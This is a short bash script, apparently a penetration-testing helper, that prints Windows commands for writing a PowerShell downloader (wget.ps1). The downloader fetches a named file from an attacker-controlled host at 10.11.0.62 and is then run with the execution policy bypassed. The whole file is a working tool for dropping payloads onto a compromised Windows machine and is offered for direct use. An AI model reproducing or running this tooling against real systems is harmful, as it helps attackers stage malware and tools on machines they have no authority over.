#!/bin/bash
tfile=$1

echo "echo \$storageDir = \$pwd > wget.ps1 &  echo \$webclient = New-Object System.Net.WebClient >>wget.ps1  & echo \$url = \"http://10.11.0.62/$tfile\" >>wget.ps1 & echo \$file = \"$tfile\" >>wget.ps1 & echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1"

echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"

exit 0
